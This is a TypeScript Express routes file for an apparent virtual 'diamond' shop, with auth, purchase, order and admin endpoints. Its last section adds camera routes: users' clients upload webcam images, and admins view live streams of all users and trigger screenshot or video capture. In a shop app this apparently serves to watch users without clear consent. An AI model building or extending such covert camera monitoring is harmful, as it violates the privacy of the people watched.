import type { Express, Request } from "express";
import { storage } from "./storage";
import { setupAuth, isAuthenticated, isAdmin, getCurrentUser } from "./auth";
import { insertOrderSchema } from "@shared/schema";
import { purchaseSchema, adjustDiamondsSchema } from "@shared/validation";
import { fromZodError } from "zod-validation-error";
import { z } from "zod";

// Validation schemas
const signupSchema = z.object({
  email: z.string().email(),
  password: z.string().min(6),
  firstName: z.string().optional(),
  lastName: z.string().optional(),
});

const loginSchema = z.object({
  email: z.string().email(),
  password: z.string(),
});

export async function registerRoutes(app: Express): Promise<void> {
  // Setup auth middleware
  await setupAuth(app);

  // Auth routes
  app.post('/api/auth/signup', async (req, res) => {
    try {
      const parseResult = signupSchema.safeParse(req.body);
      if (!parseResult.success) {
        const validationError = fromZodError(parseResult.error);
        return res.status(400).json({ message: validationError.message });
      }

      const { email, password, firstName, lastName } = parseResult.data;

      // Check if user already exists
      const existingUser = await storage.getUserByEmail(email);
      if (existingUser) {
        return res.status(400).json({ message: "Email already registered" });
      }

      // Create new user
      const user = await storage.createUser({
        email,
        password,
        firstName,
        lastName,
        isAdmin: false,
        diamondBalance: 1000, // Starting balance
      });

      // Set session
      (req.session as any).userId = user.id;

      // Return user without password
      const { password: _, ...userWithoutPassword } = user;
      res.json(userWithoutPassword);
    } catch (error) {
      console.error("Error during signup:", error);
      res.status(500).json({ message: "Failed to create account" });
    }
  });

  app.post('/api/auth/login', async (req, res) => {
    try {
      const parseResult = loginSchema.safeParse(req.body);
      if (!parseResult.success) {
        const validationError = fromZodError(parseResult.error);
        return res.status(400).json({ message: validationError.message });
      }

      const { email, password } = parseResult.data;

      // Find user by email
      const user = await storage.getUserByEmail(email);
      if (!user) {
        return res.status(401).json({ message: "Invalid email or password" });
      }

      // Verify password
      if (!storage.verifyPassword(password, user.password)) {
        return res.status(401).json({ message: "Invalid email or password" });
      }

      // Set session
      (req.session as any).userId = user.id;

      // Return user without password
      const { password: _, ...userWithoutPassword } = user;
      res.json(userWithoutPassword);
    } catch (error) {
      console.error("Error during login:", error);
      res.status(500).json({ message: "Failed to login" });
    }
  });

  app.post('/api/auth/logout', (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "Failed to logout" });
      }
      res.json({ message: "Logged out successfully" });
    });
  });

  app.get('/api/auth/user', isAuthenticated, async (req, res) => {
    try {
      const user = await getCurrentUser(req);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Return user without password
      const { password: _, ...userWithoutPassword } = user;
      res.json(userWithoutPassword);
    } catch (error) {
      console.error("Error fetching user:", error);
      res.status(500).json({ message: "Failed to fetch user" });
    }
  });

  // Product routes
  app.get('/api/products', async (req, res) => {
    try {
      const products = await storage.getAllProducts();
      res.json(products);
    } catch (error) {
      console.error("Error fetching products:", error);
      res.status(500).json({ message: "Failed to fetch products" });
    }
  });

  // Purchase route
  app.post('/api/purchase', isAuthenticated, async (req, res) => {
    try {
      const user = await getCurrentUser(req);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Validate request body with Zod
      const parseResult = purchaseSchema.safeParse(req.body);
      if (!parseResult.success) {
        const validationError = fromZodError(parseResult.error);
        return res.status(400).json({ message: validationError.message });
      }

      const { productId } = parseResult.data;

      const product = await storage.getProduct(productId);

      if (!product) {
        return res.status(404).json({ message: "Product not found" });
      }

      if (user.diamondBalance < product.price) {
        return res.status(400).json({ message: "Insufficient diamonds" });
      }

      // Deduct diamonds and create order
      const updatedUser = await storage.adjustUserDiamonds(user.id, -product.price);
      const order = await storage.createOrder({
        userId: user.id,
        productId,
        status: "pending",
      });

      res.json({ order, user: updatedUser });
    } catch (error: any) {
      console.error("Error processing purchase:", error);
      res.status(500).json({ message: error.message || "Failed to process purchase" });
    }
  });

  // User orders route
  app.get('/api/orders', isAuthenticated, async (req, res) => {
    try {
      const user = await getCurrentUser(req);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      const orders = await storage.getUserOrders(user.id);
      res.json(orders);
    } catch (error) {
      console.error("Error fetching orders:", error);
      res.status(500).json({ message: "Failed to fetch orders" });
    }
  });

  // Admin: Get all users
  app.get('/api/admin/users', isAuthenticated, isAdmin, async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      // Remove passwords from response
      const usersWithoutPasswords = users.map(({ password, ...user }) => user);
      res.json(usersWithoutPasswords);
    } catch (error) {
      console.error("Error fetching users:", error);
      res.status(500).json({ message: "Failed to fetch users" });
    }
  });

  // Admin: Delete user
  app.delete('/api/admin/users/:id', isAuthenticated, isAdmin, async (req, res) => {
    try {
      const { id } = req.params;
      await storage.deleteUser(id);
      res.json({ message: "User deleted successfully" });
    } catch (error) {
      console.error("Error deleting user:", error);
      res.status(500).json({ message: "Failed to delete user" });
    }
  });

  // Admin: Adjust user diamonds
  app.post('/api/admin/adjust-diamonds', isAuthenticated, isAdmin, async (req, res) => {
    try {
      // Validate request body with Zod
      const parseResult = adjustDiamondsSchema.safeParse(req.body);
      if (!parseResult.success) {
        const validationError = fromZodError(parseResult.error);
        return res.status(400).json({ message: validationError.message });
      }

      const { userId, amount } = parseResult.data;

      const user = await storage.adjustUserDiamonds(userId, amount);

      // Remove password from response
      const { password: _, ...userWithoutPassword } = user;
      res.json(userWithoutPassword);
    } catch (error: any) {
      console.error("Error adjusting diamonds:", error);
      res.status(500).json({ message: error.message || "Failed to adjust diamonds" });
    }
  });

  // Admin: Get all orders
  app.get('/api/admin/orders', isAuthenticated, isAdmin, async (req, res) => {
    try {
      const orders = await storage.getAllOrders();
      res.json(orders);
    } catch (error) {
      console.error("Error fetching orders:", error);
      res.status(500).json({ message: "Failed to fetch orders" });
    }
  });

  // Admin: Mark order as completed
  app.post('/api/admin/orders/:id/complete', isAuthenticated, isAdmin, async (req, res) => {
    try {
      const { id } = req.params;
      const order = await storage.updateOrderStatus(id, "completed");
      res.json(order);
    } catch (error) {
      console.error("Error completing order:", error);
      res.status(500).json({ message: "Failed to complete order" });
    }
  });

  // Camera streaming routes
  let cameraStreams: Map<string, { imageData: string; serverTimestamp: number; userId: string; userName: string }> = new Map();

  app.post('/api/camera/stream', isAuthenticated, async (req, res) => {
    try {
      const user = await getCurrentUser(req);
      if (!user) {
        return res.status(401).json({ message: "Unauthorized" });
      }

      const { imageData } = req.body;
      if (!imageData) {
        return res.status(400).json({ message: "Image data required" });
      }

      cameraStreams.set(user.id, {
        imageData,
        serverTimestamp: Date.now(),
        userId: user.id,
        userName: `${user.firstName || ''} ${user.lastName || ''}`.trim() || user.email,
      });

      res.json({ success: true });
    } catch (error) {
      console.error("Error streaming camera:", error);
      res.status(500).json({ message: "Failed to stream camera" });
    }
  });

  app.get('/api/admin/camera/streams', isAuthenticated, isAdmin, (req, res) => {
    try {
      const now = Date.now();
      const activeStreams = Array.from(cameraStreams.values())
        .filter(stream => now - stream.serverTimestamp < 5000)
        .map(({ imageData, userId, userName, serverTimestamp }) => ({
          userId,
          userName,
          imageData,
          serverTimestamp,
        }));

      res.json(activeStreams);
    } catch (error) {
      console.error("Error fetching camera streams:", error);
      res.status(500).json({ message: "Failed to fetch camera streams" });
    }
  });

  app.post('/api/admin/camera/capture', isAuthenticated, isAdmin, (req, res) => {
    try {
      const { userId, imageData, type } = req.body;
      
      res.json({ 
        success: true,
        message: `${type === 'screenshot' ? 'Screenshot' : 'Video'} captured successfully`,
      });
    } catch (error) {
      console.error("Error capturing:", error);
      res.status(500).json({ message: "Failed to capture" });
    }
  });
}
